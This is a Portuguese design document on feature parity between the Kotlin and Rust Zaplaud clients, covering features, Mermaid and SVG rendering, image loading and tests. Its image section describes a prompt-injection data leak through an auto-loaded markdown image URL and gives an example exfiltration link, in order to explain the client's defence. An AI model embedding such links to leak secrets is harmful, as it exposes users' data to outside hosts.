# Paridade entre os clientes Zaplaud

O Zaplaud tem dois códigos de cliente:

- **Kotlin** (`android/shared/src/commonMain`): Android e iPad (o projeto iOS só tem alvo iPad).
- **Rust** (`zaplaud-rs/`): o desktop de Linux e macOS.

O desktop Compose foi removido em 2026-11-18.

O Habblaud web (`client/`) é a referência de comportamento do servidor, mas tem interface própria.

Regra: uma mudança de comportamento em um cliente Zaplaud entra no outro na mesma entrega. Se não der, a pendência
vai para a tabela abaixo, com o motivo. Textos ficam em `android/shared/src/commonMain/composeResources/values/strings.xml`
(o Rust gera os dele desse arquivo na compilação); só textos que existem apenas no desktop ficam em
`zaplaud-rs/crates/zaplaud-ui/ui/native-strings.xml`. Cores e ícones também saem do Kotlin.

## Recursos

| Recurso | Kotlin | Rust | Observação |
|---|---|---|---|
| Login, vários servidores, relogin por servidor | sim | sim | iPad: trocar temporariamente de app preserva a tela e os campos de login digitados. |
| Abertura da lista sem esperar a resposta dos servidores | sim | sim | Ambos consultam os servidores em paralelo. Pendente no Rust: mostrar «Entrar de novo» imediatamente quando não há cookie local, sem esperar um 401. |
| Lista: abertas/recentes, busca, filtro por servidor, não lidas, subagentes | sim | sim | Ambos releem Recentes quando uma sessão some do snapshot e não está no histórico. |
| Fixar e favoritar sessões, com filtro Favoritas | sim | sim | marcas independentes e locais; fixadas primeiro dentro dos filtros, por atividade; remoção do servidor limpa só suas marcas |
| Conversa com markdown, pensamentos e ferramentas compactos, resumo, ir para o fim | sim | sim | Rust: seleção dentro de um bloco + "Copiar mensagem" (limite do Slint) |
| Resposta aberta e posição de leitura preservadas ao sair e voltar | sim | sim | estado local por conversa; rolar cancela a restauração; quem saiu acompanhando o fim volta ao fim |
| Cache de conversas com teto de espaço | Android: sim (64 MiB); iPad: **pendente** | **pendente** (limite de 500 entradas por conversa, sem teto total) | Conversas removidas do cache são baixadas de novo ao abrir. Kotlin agrupa mudanças em janelas fixas de 3 s. Rust grava expansões na hora e agenda as demais mudanças em 1 s (posição de leitura) ou 3 s (conversa e resumos), sem adiar o prazo pendente. |
| Duas colunas a partir de 840 dp, conversa usando a largura toda | sim | sim | celular: uma coluna |
| Compositor: rascunho, anexos, modos de envio, interrupção, anel de contexto, shake | sim | sim | iPad: o seletor nativo permite marcar mais de cinco arquivos, mas o app recusa a seleção com um aviso. Rust: sem arrastar arquivos para a janela (Slint 1.18). |
| Aprovação e perguntas, com resumo `text` e entrada não textual em JSON | sim | sim | Kotlin rola na horizontal; Rust quebra a linha e mostra "mais N linhas" |
| Folha de permissão fica aberta durante o envio da decisão | sim | sim | Enquanto envia, botão Cancelar, Esc e clique fora não fecham a folha. |
| Chamar personagem (também com conversa aberta em tela larga), dispensar, retomar | sim | sim | Sessões novas ignoram a pasta aberta e usam `HABBLAUD_CAST_FOLDER` ou, se ausente, a pasta pessoal. Retomar mantém a pasta da conversa retomada. |
| Confirmações de retomar e dispensar fecham ao trocar de conversa ou servidor | sim | sim | A confirmação só vale para o alvo de quando o diálogo abriu. |
| Linha da lista compacta: horário curto ao lado do título, não lidas na linha de baixo, ações sem botão ⋮ | sim | sim | Kotlin: toque longo; desktop: clique direito. Dispensar pela lista segue **pendente** no Rust (fica no menu da conversa) |
| Bate-papo paralelo, sem pular para o fim quando se lê acima | sim | sim | Abre só pelo menu da conversa. Só apaga o rascunho quando o servidor aceita a pergunta. Enquanto houver resposta em curso, uma consulta que falha é repetida após 3 segundos; o próximo sucesso limpa o erro. |
| Arquivos da pasta de trabalho: navegar e baixar | sim | sim | Android 10+: Downloads (MediaStore); Android 8/9: pasta Downloads com permissão de armazenamento; iPad: pasta do app; desktop: Downloads |
| Entregas da sessão: lista e download | sim | sim | |
| Configurações, papéis, resumos por HTTP | sim | sim | |
| Acesso por servidor em Configurações | sim | sim | Mostra conversas, mensagens, aprovações e arquivos. Campo ausente não vira bloqueio; mensagens sem proteção de sessão aparecem bloqueadas com um aviso. |
| Seletores de modelo: nomes normalizados, busca, OpenRouter por fabricante e preservação do modelo atual | sim | sim | sessão e papéis; datas e variantes distinguem rótulos sem alterar o ID escolhido |
| ZeroClaw: controles permitidos, sem anel de contexto, elenco pelo runtime | sim | sim | |
| Espera de `Retry-After` no login limitada a 24 h | sim | sim | |
| Status HTTP preservado quando o corpo de erro é truncado | sim (streams: 401, 403, 404 e 500) | sim | No Rust, vale para chamadas HTTP e para a abertura de streams SSE; no Kotlin, para a abertura de streams. |
| Notificação prioriza a conversa do aviso sobre a última conversa de outro servidor | sim (Android) | sim | «Abrir» cancela a restauração dos outros servidores e abre a sessão do aviso assim que estiver na lista. |
| Avisos de aprovação, pergunta e fim de turno | sim | sim | Android: se ativos, retomam após atualização do app ou primeiro desbloqueio depois do reinício; restrições do fabricante podem impedir a retomada. **iPad: sem avisos**; desktop: só com o app aberto. |
| Ícone na bandeja | não se aplica | sim | |
| Chaveiro destrancado quando o padrão está trancado (Linux) | não se aplica | sim | |
| Diagramas Mermaid desenhados na conversa | sim | sim | Kotlin pede o SVG ao servidor (`POST /api/mermaid`); Rust desenha localmente (`mermaid-rs-renderer`). Nos dois, só blocos fechados e até 20.000 caracteres; Rust também recusa desenho com mais de 6.000 px de altura natural, que fica como código |
| Diagrama Mermaid em tela cheia, com zoom e arrasto | sim | sim | Kotlin: pinça; desktop: botões +/− e teclado +/−, até 8×; arrasto move, duplo clique/toque restaura, Esc ou Fechar sai |
| Detalhes da sessão e do subagente: seções Estado, Modelo, Contexto e Identificadores; campos vazios ocultos | sim | sim | subagente mostra papel, tarefa, modelo e contexto próprios e leva à sessão principal; identificadores copiáveis |
| Lista de tarefas do agente | sim | sim | A folha mostra as fases e os estados; a conversa mostra o progresso acima do compositor. |
| Copiar bloco de código, código do Mermaid e mensagem inteira | sim | sim | |
| Tentar de novo após erro de envio | sim | sim | Envio ambíguo continua pedindo confirmação. Conflito de envio ou comando só fecha a conversa de origem. Uma consulta de status antiga não altera a operação seguinte. |
| Blocos `svg` desenhados na conversa, com a mesma tela cheia | sim | sim | desenho local nos dois; `var(--fg)`, `--accent` etc. viram cores fixas sobre fundo branco; só blocos fechados; Kotlin aceita até 200.000 caracteres e Rust até 200.000 bytes e 6.000 px de altura natural |
| Imagens do markdown abaixo do texto; o link continua no texto; links externos só `http`/`https` | sim | sim | `data:` e caminho absoluto do host (`/api/files/raw`) carregam sozinhos; `http`/`https` só após "Carregar imagem", sem credenciais nem redirecionamentos; até 10 MB. Link comum com destino `.png`, `.jpg`, `.jpeg`, `.gif`, `.webp` ou `.svg` também é desenhado; URL solta sem `<>` só no Kotlin. |
| Links para arquivos do projeto | sim | sim | O servidor troca o destino relativo à pasta da sessão (`[x](pasta/arte.png)`) pelo caminho absoluto, só se o arquivo existe e `/api/files` o serviria; tocar num arquivo que não é imagem abre a janela de arquivos e baixa; imagem já aparece desenhada. |

### Diagramas no cliente Kotlin

Blocos fechados com linguagem `mermaid`, na conversa e no bate-papo paralelo, são enviados a
`POST /api/mermaid` (`{ "source": "..." }`, até 20.000 caracteres). A rota usa a mesma permissão de
mensagens dos resumos e devolve `image/svg+xml`, ou erro JSON 422 se o diagrama não for válido.
O servidor usa `beautiful-mermaid`, com fundo branco e cores resolvidas para leitores SVG nativos,
sem carregar fontes remotas. Tipos não suportados pela biblioteca continuam como código.

Durante o carregamento, em blocos ainda abertos ou quando o pedido/leitor falha, permanece o bloco
de código padrão. Os últimos 32 SVGs ficam em memória, separados por instância da API; SVG que o leitor
recusa sai do cache. iPadOS usa `decodeToSvgPainter` de Compose Resources; Android usa AndroidSVG porque
Compose Resources 1.12.2 não fornece esse leitor no Android. O AndroidSVG não aceita SVG 2
(`orient="auto-start-reverse"`), por isso o servidor troca esses marcadores pelo equivalente com `orient="auto"`.
Tocar no diagrama abre tela cheia: pinça amplia até 8×, arrastar move, toque duplo volta ao inicial.

### Imagens da conversa

Baixar imagem remota sozinho deixaria texto injetado na resposta do agente vazar dados pela URL
(`![](https://site/?segredo=...)`); por isso a remota espera o toque e usa um cliente HTTP sem credenciais.
Arquivo do host usa a rota e a trava do navegador de arquivos. Se a carga ou a leitura falhar, o link
permanece no texto e o cliente mostra um aviso. Ambos recusam imagens raster acima de 4.096 × 4.096
pixels no total. O Kotlin guarda até 24 MiB de imagens codificadas; o Rust guarda até 64 MiB de imagens
decodificadas por conversa. Kotlin junta as imagens no fim da mensagem; Rust põe cada uma logo abaixo
do parágrafo que a cita.

## Verificação

### Testes automatizados locais

- Kotlin: testes de host com `android/gradlew -p android :shared:testAndroidHostTest`. A instrumentação usa
  `python3 scripts/android-instrumented-ci.py` com emulador isolado. No Mac, `scripts/ios-native-tests.sh` e
  `scripts/ios-smoke.sh` exercitam o simulador.
- Rust: `cargo test --workspace --locked` em `zaplaud-rs/` cobre o workspace e o contrato com o servidor.
  Os roteiros gráficos também podem rodar em X11 via Xvfb.
- Os testes de integração usam o servidor isolado de `scripts/android-smoke.ts`, não a instalação de produção.
  Consulte os resultados registrados no [índice dos planos](../plans/README.md).

### Workflows do GitHub

- [Android](../.github/workflows/android.yml): testes de host, lint e builds debug e release; instrumentação em
  emulador API 35 quando há KVM, com artefatos de diagnóstico.
- [iPadOS](../.github/workflows/ios.yml): build, testes nativos e smoke no simulador Apple Silicon; IPA sem assinatura.
- [Zaplaud Rust](../.github/workflows/zaplaud-rs.yml): testes do workspace e do contrato, roteiros de conversa,
  teclado e acessibilidade nos dois temas em Xvfb e, fora de pull requests, empacotamento Linux.
- [CI](../.github/workflows/ci.yml): tipos, traduções TypeScript, testes e build do projeto Node no Ubuntu e no Windows.
  O gate de traduções não verifica Markdown.

### Conferência manual pendente

- Aparelho físico: atualização Android sobre uma instalação anterior; no iPad, instalação, VoiceOver,
  persistência após reassinatura, atualização e renovação pelo SideStore, e convivência com Tailscale.
- Desktop real: sessão Wayland, persistência no chaveiro Linux e funcionamento da bandeja no ambiente de uso.
  O CI Rust não testa macOS.
- Entregas: falta conferir a lista e os downloads com entregas reais no cliente móvel e no desktop.
